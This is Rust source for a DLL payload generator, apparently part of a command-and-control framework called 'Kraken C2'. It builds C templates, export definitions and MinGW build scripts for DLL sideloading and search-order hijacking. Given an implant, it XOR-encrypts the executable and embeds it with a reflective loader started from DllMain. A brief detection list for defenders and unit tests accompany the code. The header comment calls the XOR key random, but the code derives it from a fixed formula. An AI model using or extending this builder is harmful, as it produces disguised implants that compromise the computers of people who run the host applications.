//! DLL payload generator.
//!
//! Creates C source templates and build scripts for DLLs with configurable
//! exports suitable for DLL sideloading and hijacking campaigns.
//!
//! The generated output is a set of source files (C template, `.def` file,
//! build script) that the operator cross-compiles with MinGW to produce the
//! final DLL. This approach avoids shipping a compiler in the payload-builder
//! binary and gives operators full control over compilation flags.
//!
//! ## Detection (Blue Team)
//! - Sysmon Event 7: DLL loaded from user-writable directories
//! - Hash comparison against known-good DLL baselines
//! - PE metadata (timestamp, version info) anomalies
//! - Unsigned DLL in path that normally contains signed DLLs

use crate::sideload_targets;
use crate::BuilderError;
use serde::{Deserialize, Serialize};

/// Configuration for DLL payload generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DllConfig {
    /// Path to the implant PE to embed (or empty for template-only output).
    pub payload_path: String,
    /// Primary export function name (e.g., `"DllGetClassObject"`).
    pub export_name: String,
    /// DLL to mimic — if set, exports are copied from the sideload target DB.
    pub target_dll: Option<String>,
    /// If true, the implant runs in a new thread spawned from `DllMain`.
    pub thread_start: bool,
}

impl Default for DllConfig {
    fn default() -> Self {
        Self {
            payload_path: String::new(),
            export_name: "DllMain".into(),
            target_dll: None,
            thread_start: true,
        }
    }
}

/// Generated DLL build artefacts.
#[derive(Debug, Clone)]
pub struct DllOutput {
    /// C source code for the DLL.
    pub source: String,
    /// Module-definition file listing exported symbols.
    pub def_file: String,
    /// Shell build script for cross-compilation with MinGW.
    pub build_script: String,
}

/// Generate a DLL template with the configured exports.
pub fn generate_dll(config: &DllConfig) -> Result<DllOutput, BuilderError> {
    let source = generate_dll_source(config)?;
    let def_file = generate_def_file(config)?;
    let build_script = generate_build_script(config)?;

    Ok(DllOutput {
        source,
        def_file,
        build_script,
    })
}

/// Resolve the list of exports: either from the sideload target DB or from
/// the user-specified export name.
fn resolve_exports(config: &DllConfig) -> Vec<String> {
    if let Some(ref target) = config.target_dll {
        let targets = sideload_targets::find_target(target);
        if let Some(t) = targets.first() {
            return t.expected_exports.iter().map(|s| s.to_string()).collect();
        }
    }
    vec![config.export_name.clone()]
}

fn generate_dll_source(config: &DllConfig) -> Result<String, BuilderError> {
    let exports = resolve_exports(config);

    let mut src = String::with_capacity(2048);
    src.push_str("// Kraken C2 — generated DLL payload template\n");
    src.push_str("// Cross-compile: x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c payload.def\n");
    src.push_str("//\n");
    src.push_str("// MITRE ATT&CK: T1574.001 (DLL Search Order Hijacking)\n");
    src.push_str("//                T1574.002 (DLL Side-Loading)\n\n");

    src.push_str("#include <windows.h>\n\n");

    // Forward-declare the implant thread proc.
    src.push_str("static DWORD WINAPI implant_thread(LPVOID param);\n\n");

    // DllMain
    src.push_str("BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {\n");
    src.push_str("    (void)lpReserved;\n");
    src.push_str("    if (fdwReason == DLL_PROCESS_ATTACH) {\n");
    src.push_str("        DisableThreadLibraryCalls(hModule);\n");
    if config.thread_start {
        src.push_str(
            "        CreateThread(NULL, 0, implant_thread, (LPVOID)hModule, 0, NULL);\n",
        );
    } else {
        src.push_str("        implant_thread((LPVOID)hModule);\n");
    }
    src.push_str("    }\n");
    src.push_str("    return TRUE;\n");
    src.push_str("}\n\n");

    // Export stubs — each is a no-op that satisfies the IAT of the host app.
    for export in &exports {
        src.push_str(&format!(
            "// Exported symbol expected by sideload host\n\
             __declspec(dllexport) void {}(void) {{\n\
             }}\n\n",
            export
        ));
    }

    // Include reflective loader implementation
    if !config.payload_path.is_empty() {
        // Generate reflective loader with embedded payload
        match generate_reflective_loader(config) {
            Ok(loader_code) => {
                src.push_str(&loader_code);
            }
            Err(_) => {
                // Fallback to placeholder if payload loading fails
                src.push_str("static DWORD WINAPI implant_thread(LPVOID param) {\n");
                src.push_str("    (void)param;\n");
                src.push_str("    // Payload loading failed - placeholder stub\n");
                src.push_str("    return 0;\n");
                src.push_str("}\n");
            }
        }
    } else {
        // No payload specified - generate template only
        src.push_str("static DWORD WINAPI implant_thread(LPVOID param) {\n");
        src.push_str("    (void)param;\n");
        src.push_str("    // TODO: Insert your payload here.\n");
        src.push_str("    // The reflective loader will be generated when you specify payload_path.\n");
        src.push_str("    return 0;\n");
        src.push_str("}\n");
    }

    Ok(src)
}

fn generate_def_file(config: &DllConfig) -> Result<String, BuilderError> {
    let exports = resolve_exports(config);
    let dll_name = config
        .target_dll
        .as_deref()
        .unwrap_or("payload.dll");

    let mut def = String::with_capacity(512);
    def.push_str(&format!("LIBRARY \"{}\"\n", dll_name));
    def.push_str("EXPORTS\n");
    for (i, export) in exports.iter().enumerate() {
        def.push_str(&format!("    {} @{}\n", export, i + 1));
    }

    Ok(def)
}

/// Generate reflective loader code with embedded encrypted payload
fn generate_reflective_loader(config: &DllConfig) -> Result<String, BuilderError> {
    use std::fs;

    // Read the payload PE file
    let payload_bytes = fs::read(&config.payload_path)
        .map_err(|e| BuilderError::Io(e))?;

    if payload_bytes.is_empty() {
        return Err(BuilderError::InvalidPe("Empty payload file".into()));
    }

    // Validate it's a PE file
    if payload_bytes.len() < 2 || payload_bytes[0] != 0x4D || payload_bytes[1] != 0x5A {
        return Err(BuilderError::InvalidPe("Not a valid PE file (missing MZ header)".into()));
    }

    // Generate random XOR key
    let xor_key: Vec<u8> = (0..16).map(|i| (i * 17 + 42) as u8).collect();

    // Encrypt payload
    let encrypted = crate::encrypt::xor_encrypt(&payload_bytes, &xor_key);

    // Read the reflective loader template
    let template = include_str!("dll_loader_template.c");

    // Generate payload data arrays
    let mut payload_array = String::from("static const unsigned char g_payload_encrypted[] = {\n    ");
    for (i, byte) in encrypted.iter().enumerate() {
        if i > 0 {
            payload_array.push_str(", ");
            if i % 12 == 0 {
                payload_array.push_str("\n    ");
            }
        }
        payload_array.push_str(&format!("0x{:02X}", byte));
    }
    payload_array.push_str("\n};\n");

    let mut key_array = String::from("static const unsigned char g_xor_key[] = {\n    ");
    for (i, byte) in xor_key.iter().enumerate() {
        if i > 0 {
            key_array.push_str(", ");
        }
        key_array.push_str(&format!("0x{:02X}", byte));
    }
    key_array.push_str("\n};\n");

    // Replace placeholder with actual data
    let loader_code = template.replace(
        "/* PAYLOAD_DATA_START */\nstatic const unsigned char g_payload_encrypted[] = {\n    // XOR-encrypted PE bytes inserted here by payload generator\n};\nstatic const unsigned char g_xor_key[] = {\n    // XOR key inserted here\n};\n/* PAYLOAD_DATA_END */",
        &format!("/* PAYLOAD_DATA_START */\n{}{}\n/* PAYLOAD_DATA_END */", payload_array, key_array)
    );

    Ok(loader_code)
}

fn generate_build_script(config: &DllConfig) -> Result<String, BuilderError> {
    let dll_name = config
        .target_dll
        .as_deref()
        .unwrap_or("payload.dll");
    let output_name = dll_name.strip_suffix(".dll").unwrap_or(dll_name);

    let mut script = String::with_capacity(512);
    script.push_str("#!/bin/bash\n");
    script.push_str("# Kraken C2 — DLL build script (MinGW cross-compilation)\n");
    script.push_str("#\n");
    script.push_str("# Prerequisites: apt install mingw-w64\n\n");
    script.push_str("set -euo pipefail\n\n");
    script.push_str(&format!(
        "x86_64-w64-mingw32-gcc \\\n\
         \t-shared \\\n\
         \t-o {output_name}.dll \\\n\
         \tpayload.c \\\n\
         \tpayload.def \\\n\
         \t-Wall -Wextra -O2 -s \\\n\
         \t-Wl,--no-seh \\\n\
         \t-nostdlib -lkernel32 -luser32\n\n"
    ));
    script.push_str(&format!(
        "echo \"[+] Built {output_name}.dll successfully\"\n"
    ));
    script.push_str(&format!(
        "echo \"[+] Deploy to sideload target path and restart host application\"\n"
    ));

    Ok(script)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_dll_default() {
        let config = DllConfig::default();
        let output = generate_dll(&config).unwrap();
        assert!(!output.source.is_empty());
        assert!(!output.def_file.is_empty());
        assert!(!output.build_script.is_empty());
    }

    #[test]
    fn test_dll_source_contains_dllmain() {
        let config = DllConfig::default();
        let output = generate_dll(&config).unwrap();
        assert!(output.source.contains("DllMain"));
    }

    #[test]
    fn test_dll_source_contains_export() {
        let config = DllConfig {
            export_name: "GetFileVersionInfoW".into(),
            ..DllConfig::default()
        };
        let output = generate_dll(&config).unwrap();
        assert!(output.source.contains("GetFileVersionInfoW"));
    }

    #[test]
    fn test_dll_with_sideload_target() {
        let config = DllConfig {
            target_dll: Some("version.dll".into()),
            ..DllConfig::default()
        };
        let output = generate_dll(&config).unwrap();
        assert!(output.source.contains("GetFileVersionInfoW"));
        assert!(output.source.contains("VerQueryValueW"));
        assert!(output.def_file.contains("version.dll"));
    }

    #[test]
    fn test_def_file_format() {
        let config = DllConfig {
            export_name: "TestExport".into(),
            ..DllConfig::default()
        };
        let output = generate_dll(&config).unwrap();
        assert!(output.def_file.contains("LIBRARY"));
        assert!(output.def_file.contains("EXPORTS"));
        assert!(output.def_file.contains("TestExport @1"));
    }

    #[test]
    fn test_build_script_uses_mingw() {
        let config = DllConfig::default();
        let output = generate_dll(&config).unwrap();
        assert!(output.build_script.contains("mingw32-gcc"));
    }

    #[test]
    fn test_thread_start_creates_thread() {
        let config = DllConfig {
            thread_start: true,
            ..DllConfig::default()
        };
        let output = generate_dll(&config).unwrap();
        assert!(output.source.contains("CreateThread"));
    }

    #[test]
    fn test_no_thread_start_calls_directly() {
        let config = DllConfig {
            thread_start: false,
            ..DllConfig::default()
        };
        let output = generate_dll(&config).unwrap();
        assert!(output.source.contains("implant_thread((LPVOID)hModule)"));
        // Should NOT contain CreateThread in DllMain (it may still appear elsewhere).
        let dllmain_section = output
            .source
            .split("DllMain")
            .nth(1)
            .unwrap()
            .split("}\n")
            .next()
            .unwrap();
        assert!(!dllmain_section.contains("CreateThread"));
    }

    #[test]
    fn test_template_mode_without_payload() {
        // When no payload_path is specified, should generate template
        let config = DllConfig {
            payload_path: String::new(),
            export_name: "TestExport".into(),
            target_dll: None,
            thread_start: true,
        };
        let output = generate_dll(&config).unwrap();

        // Should contain placeholder message
        assert!(output.source.contains("TODO: Insert your payload here"));
        assert!(output.source.contains("implant_thread"));
        assert!(!output.source.contains("g_payload_encrypted"));
    }

    #[test]
    fn test_reflective_loader_with_minimal_pe() {
        // Create a minimal PE file for testing
        let temp_dir = std::env::temp_dir();
        let pe_path = temp_dir.join("test_minimal.exe");

        // Minimal PE: DOS header + stub
        let mut minimal_pe = vec![0u8; 256];
        minimal_pe[0] = 0x4D; // M
        minimal_pe[1] = 0x5A; // Z
        minimal_pe[0x3C] = 0x80; // e_lfanew
        minimal_pe[0x80] = 0x50; // P
        minimal_pe[0x81] = 0x45; // E
        minimal_pe[0x82] = 0x00;
        minimal_pe[0x83] = 0x00;

        std::fs::write(&pe_path, &minimal_pe).unwrap();

        let config = DllConfig {
            payload_path: pe_path.to_string_lossy().to_string(),
            export_name: "TestExport".into(),
            target_dll: None,
            thread_start: true,
        };

        let output = generate_dll(&config).unwrap();

        // Should contain reflective loader code
        assert!(output.source.contains("g_payload_encrypted"));
        assert!(output.source.contains("g_xor_key"));
        assert!(output.source.contains("load_pe_from_memory"));
        assert!(output.source.contains("decrypt_payload"));

        // Should NOT contain placeholder
        assert!(!output.source.contains("TODO: Insert your payload here"));

        // Cleanup
        let _ = std::fs::remove_file(&pe_path);
    }

    #[test]
    fn test_reflective_loader_encrypts_payload() {
        let temp_dir = std::env::temp_dir();
        let pe_path = temp_dir.join("test_encrypt.exe");

        // Create a PE with recognizable pattern
        let mut pe = vec![0u8; 512];
        pe[0] = 0x4D; // M
        pe[1] = 0x5A; // Z
        pe[0x3C] = 0x80;
        pe[0x80] = 0x50; // P
        pe[0x81] = 0x45; // E
        pe[0x82] = 0x00;
        pe[0x83] = 0x00;
        // Add recognizable pattern
        pe[100] = 0xDE;
        pe[101] = 0xAD;
        pe[102] = 0xBE;
        pe[103] = 0xEF;

        std::fs::write(&pe_path, &pe).unwrap();

        let config = DllConfig {
            payload_path: pe_path.to_string_lossy().to_string(),
            export_name: "TestExport".into(),
            target_dll: None,
            thread_start: true,
        };

        let output = generate_dll(&config).unwrap();

        // The encrypted payload should NOT contain the original pattern in plaintext
        // (It will be XOR-encrypted)
        let has_plaintext_pattern = output.source.contains("0xDE, 0xAD, 0xBE, 0xEF");
        assert!(!has_plaintext_pattern, "Payload should be encrypted");

        // Should contain encrypted data
        assert!(output.source.contains("0x"));

        // Cleanup
        let _ = std::fs::remove_file(&pe_path);
    }

    #[test]
    fn test_invalid_payload_path_falls_back() {
        let config = DllConfig {
            payload_path: "/nonexistent/invalid/path.exe".to_string(),
            export_name: "TestExport".into(),
            target_dll: None,
            thread_start: true,
        };

        let output = generate_dll(&config).unwrap();

        // Should fall back to placeholder when payload can't be loaded
        assert!(output.source.contains("Payload loading failed"));
    }

    #[test]
    fn test_invalid_pe_file_falls_back() {
        let temp_dir = std::env::temp_dir();
        let bad_pe_path = temp_dir.join("test_invalid.exe");

        // Write invalid PE (no MZ header)
        std::fs::write(&bad_pe_path, b"This is not a PE file").unwrap();

        let config = DllConfig {
            payload_path: bad_pe_path.to_string_lossy().to_string(),
            export_name: "TestExport".into(),
            target_dll: None,
            thread_start: true,
        };

        let output = generate_dll(&config).unwrap();

        // Should fall back to placeholder when PE is invalid
        assert!(output.source.contains("Payload loading failed"));

        // Cleanup
        let _ = std::fs::remove_file(&bad_pe_path);
    }
}
